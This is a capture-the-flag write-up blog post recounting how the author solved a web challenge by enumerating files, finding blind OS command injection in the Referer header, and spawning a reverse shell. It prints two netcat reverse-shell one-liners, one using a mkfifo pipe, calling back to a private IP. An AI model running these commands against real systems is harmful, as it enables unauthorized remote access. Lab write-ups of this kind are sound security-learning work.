
# #CTFFriday January 2020 W5 - {WEB}
*January 31, 2020 (2 to 3 PM)*

Hi! I am [Bipin Jitiya](https://win3zz.com), working as security analyst at [Net Square Solutions Pvt. Ltd.](https://www.net-square.com/) In this post I am writing about a CTF which was organized as a part of the [NSConclave 2020](https://nsconclave.net-square.com/) event. Unfortunately I did not play on the day of the event. Many challenges were solved by several players, but none were able to solve one challenge, which was later hosted as **#CTFFriday**. 

This CTF was built by [Bhargav Gajera](https://twitter.com/bhargavgajera10) and organized by [Net Square Solutions Pvt. Ltd.](https://www.net-square.com/) and [NSConclave](https://nsconclave.net-square.com/) on January 31, 2020. So the following is my detailed write-up on how I solved that challenge.

## The game begins!

The task name was **WEB**, where only one URL was provided. As the name suggests, a web application was hosted at the mentioned URL.
 
![1](https://user-images.githubusercontent.com/12781459/203560066-721c4a9a-1c93-4e1b-941e-a132caa772a4.png)

I started with the general web application testing approach. I crawled all the web pages, and started looking for any hints in the **HTML** and **JavaScript** comments (in source code).

![2](https://user-images.githubusercontent.com/12781459/203560144-8e2b3c6f-6230-4a05-83de-ba1c68452b68.png)

I also checked **robots.txt** for files and directories hidden from search engines, but that file does not exist on the target server. After all the analysis, I noticed that there is a **page** parameter that changes its value when navigating to a different page. I quickly tested this for **Directory traversal vulnerability** using some standard payloads but no success.
 
![3](https://user-images.githubusercontent.com/12781459/203560178-ff41213b-666a-4be6-8a5f-12d12b224992.png)

As usual, when I don't get anything, I start **enumeration**. This time also I launched a dictionary based attack against the web server. I simply started **brute force directories and files** in websites using intruder. Obviously we can do this using the **dirb** and **dirsearch** tools. Some CTF challenges also have hints in the "404 Not Found" page, **dirb** and **dirsearch** may not mark those webpages at that time. I did not want to leave any stone unturned. As a result I got a **sitemap.xml** file. It contains an URL entry [https://www.127.0.0.1/index.php?page=admin](https://www.127.0.0.1/index.php?page=admin) 

![4](https://user-images.githubusercontent.com/12781459/203560200-e4229055-a307-46c8-9e6a-f456a1752986.png)

When I opened that URL from the browser, it automatically redirected me to the homepage. This seemed interesting, I intercepted the same request in burp and started the weird test by adding some extra parameters like username and password, started fuzz on those parameters with random payloads, but to no effect.

![5](https://user-images.githubusercontent.com/12781459/203560221-a7ddd3ed-4d83-40d7-9e7c-c422a21cd74e.png)

The response contains the string "**log:**" so added a new Log header with a random string as the value, but again no effect.

![6](https://user-images.githubusercontent.com/12781459/203560252-e35be2c8-409c-433b-8ac8-dc282da0586e.png)

After wasting a lot of time on that, I felt that the response **user requesting from** might be some kind of hint.

I thought **user requesting from** means the previous web page from which a link to the currently requested page was followed. That process is done by the **Referer** request header. I quickly added a **Referer** request header and its value was reflected back into the response body.

![7](https://user-images.githubusercontent.com/12781459/203560282-56a4acd9-5145-41cd-a528-44ed47069888.png)

After fuzzing on the **Referer** request header, I found that it was vulnerable to blind OS command injection. I tried to get the reverse shell using the following command: 

```console
root@ns:~# nc -e /bin/sh 192.168.43.101 7171
```
![8](https://user-images.githubusercontent.com/12781459/203560315-79029206-474c-4b18-944f-f1849b1ff880.png)

It was not connecting. I thought there might be some problem with **nc**. I remembered a [post](http://www.gnucitizen.org/blog/reverse-shell-with-bash/#comment-127498) about how to get reverse shell when wrong version of netcat is installed. I got the reverse shell using following payload:

```console
root@ns:~# rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 1192.168.43.101 7171 >/tmp/f
```
![9](https://user-images.githubusercontent.com/12781459/203560343-10d0bd0c-9b0e-408f-bc72-7d577e3fdc70.png)

It worked! I got the flag after executing some commands!
 
![10](https://user-images.githubusercontent.com/12781459/203560372-abb5a53b-1368-442d-8b50-8c8236fb13a5.png)


Thanks for reading. Keep learning.

Stay safe and healthy 😇
